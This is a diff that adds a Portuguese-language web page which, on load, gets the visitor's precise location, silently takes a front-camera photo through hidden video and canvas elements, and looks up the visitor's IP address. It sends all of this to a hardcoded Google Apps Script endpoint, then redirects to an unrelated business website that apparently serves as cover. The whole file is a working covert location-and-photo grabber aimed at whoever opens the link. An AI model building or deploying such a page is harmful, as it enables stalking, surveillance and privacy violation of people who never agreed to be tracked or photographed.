@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Localizando e Capturando...</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+    p {
+      padding: 10px;
+      margin: 5px;
+    }
+    video {
+      /* Oculta o vídeo, ele será usado apenas para capturar o frame */
+      display: none;
+      width: 320px; /* Tamanho da área de captura do vídeo */
+      height: 240px;
+      background-color: #333;
+    }
+    canvas {
+      display: none; /* Oculta o canvas */
+    }
+  </style>
+  <script>
+    let videoStream = null; // Variável para armazenar o stream da câmera
+    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbyzRAza0aUzlqUYhuTozf8IrDD4G4OLQGMkgR_CB7gTRa2cNPXHL-0rcSVsj1A6jDKi/exec'; // SEU URL DO WEBAPP AQUI!
+
+    window.onload = function() {
+      document.body.innerHTML = "<p>📍 Obtendo sua localização... Aguarde...</p>";
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sucessoLocalizacao, erroLocalizacao, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      } else {
+        document.body.innerHTML = "<p>Seu navegador não suporta geolocalização.</p>";
+        // Se a geolocalização não é suportada, tenta apenas a câmera
+        iniciarCapturaCamera(null, null);
+      }
+    };
+
+    function sucessoLocalizacao(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      document.body.innerHTML += `<p>✅ Localização obtida!</p>`;
+      iniciarCapturaCamera(latitude, longitude);
+    }
+
+    function erroLocalizacao(err) {
+      console.warn("Geolocalização não permitida ou erro:", err.message);
+      let msg = "<p>⚠️ É necessário permitir a localização para continuar.</p>";
+      if (err.code === 1) {
+        msg = "<p>❌ Acesso à localização negado. Por favor, permita.</p>";
+      } else if (err.code === 3) {
+        msg = "<p>⌛ Tempo limite para obter localização excedido.</p>";
+      }
+      document.body.innerHTML = msg;
+      // Continua para a câmera mesmo se a localização falhar
+      iniciarCapturaCamera(null, null);
+    }
+
+    async function iniciarCapturaCamera(latitude, longitude) {
+      document.body.innerHTML += "<p>📷 Solicitando acesso à câmera... Aguarde...</p>";
+      try {
+        // Preferência pela câmera frontal (user). Se precisar da traseira, mude para "environment"
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        videoStream = stream; // Armazena o stream para poder parar depois
+
+        const video = document.createElement('video');
+        video.autoplay = true;
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          video.play(); // Garante que o vídeo comece a tocar
+          setTimeout(() => {
+            capturarImagem(latitude, longitude);
+          }, 500); // Pequeno atraso para garantir que o stream está estável
+        };
+        document.body.appendChild(video); // Adiciona o vídeo ao DOM (pode ser invisível)
+
+      } catch (err) {
+        console.error("Erro ao acessar a câmera:", err);
+        let cameraErrorMsg = "<p>❌ Erro ao acessar a câmera. Certifique-se de permitir o acesso.</p>";
+        if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
+          cameraErrorMsg = "<p>🚫 Acesso à câmera negado. Por favor, permita.</p>";
+        } else if (err.name === "NotFoundError") {
+          cameraErrorMsg = "<p>📸 Nenhuma câmera encontrada.</p>";
+        }
+        document.body.innerHTML += cameraErrorMsg;
+        // Redireciona mesmo se a câmera falhar
+        enviarDadosParaSheets(latitude, longitude, null); // Envia sem a imagem
+      }
+    }
+
+    function capturarImagem(latitude, longitude) {
+      const video = document.querySelector('video');
+      if (!video || !videoStream) {
+        console.error("Vídeo ou stream da câmera não disponível para captura.");
+        enviarDadosParaSheets(latitude, longitude, null); // Envia sem a imagem
+        return;
+      }
+
+      const canvas = document.createElement('canvas');
+      // Define a resolução da imagem capturada (pode ajustar)
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const context = canvas.getContext('2d');
+
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Converte a imagem para uma URL base64. Qualidade 0.9 para JPEG.
+      const imageDataURL = canvas.toDataURL('image/jpeg', 0.9);
+
+      // Para de usar a câmera
+      if (videoStream) {
+        videoStream.getTracks().forEach(track => track.stop());
+        videoStream = null;
+      }
+      if (video.parentNode) {
+        video.parentNode.removeChild(video); // Remove o elemento de vídeo do DOM
+      }
+      document.body.innerHTML += `<p>📸 Imagem capturada!</p>`;
+      enviarDadosParaSheets(latitude, longitude, imageDataURL);
+    }
+
+    async function enviarDadosParaSheets(latitude, longitude, imageDataURL) {
+      document.body.innerHTML += `<p>🚀 Enviando dados...</p>`;
+      let ip = 'Não detectado';
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        ip = data.ip;
+      } catch (error) {
+        console.error("Erro ao obter IP:", error);
+      }
+
+      const mapsLink = latitude && longitude ? `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}` : 'Localização não disponível';
+
+      const payload = {
+        latitude: latitude,
+        longitude: longitude,
+        ip: ip,
+        maps: mapsLink,
+        // Inclui a imagem em base64 APENAS SE HOUVER
+        imagem: imageDataURL || 'N/A' // Envia 'N/A' se não houver imagem
+      };
+
+      try {
+        // Usamos POST e esperamos uma resposta para saber se foi bem-sucedido
+        const response = await fetch(WEBAPP_URL, {
+          method: 'POST',
+          // mode: 'no-cors' REMOVIDO: O web app do Google Apps Script precisa de CORS para uma resposta
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        // Verifique a resposta do servidor do Google Apps Script
+        if (response.ok) {
+          console.log("Dados enviados com sucesso para o Google Sheets.");
+          document.body.innerHTML += `<p>✅ Dados enviados!</p>`;
+        } else {
+          const errorText = await response.text();
+          console.error("Erro ao enviar dados para o Google Sheets:", response.status, errorText);
+          document.body.innerHTML += `<p>❌ Erro ao enviar dados. Tente novamente.</p>`;
+        }
+      } catch (error) {
+        console.error("Erro de rede ao enviar dados para o Google Sheets:", error);
+        document.body.innerHTML += `<p>❌ Erro de conexão. Tente novamente.</p>`;
+      } finally {
+        // Garante que o redirecionamento aconteça após a tentativa de envio
+        redirecionaDespachanteMauro();
+      }
+    }
+
+    // Função de redirecionamento final
+    function redirecionaDespachanteMauro() {
+      document.body.innerHTML += "<p>➡️ Redirecionando...</p>";
+      setTimeout(() => {
+        window.location.href = "https://despachantemauro.com.br/";
+      }, 2000); // Pequeno atraso para a mensagem ser vista
+    }
+  </script>
+</head>
+<body>
+  <p>Iniciando...</p>
+</body>
+</html>
